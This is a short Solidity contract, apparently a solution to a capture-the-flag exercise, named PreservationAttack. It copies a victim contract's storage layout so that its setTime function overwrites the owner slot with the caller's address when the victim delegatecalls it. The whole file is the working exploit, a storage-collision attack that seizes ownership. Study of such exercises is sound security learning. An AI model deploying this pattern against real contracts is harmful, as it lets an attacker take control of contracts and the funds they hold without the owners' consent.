// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {

    address One;
    address Two;
    address public theOwner;
    uint storedTime;

    function setTime(uint _time) public {
        theOwner = msg.sender;
    }
}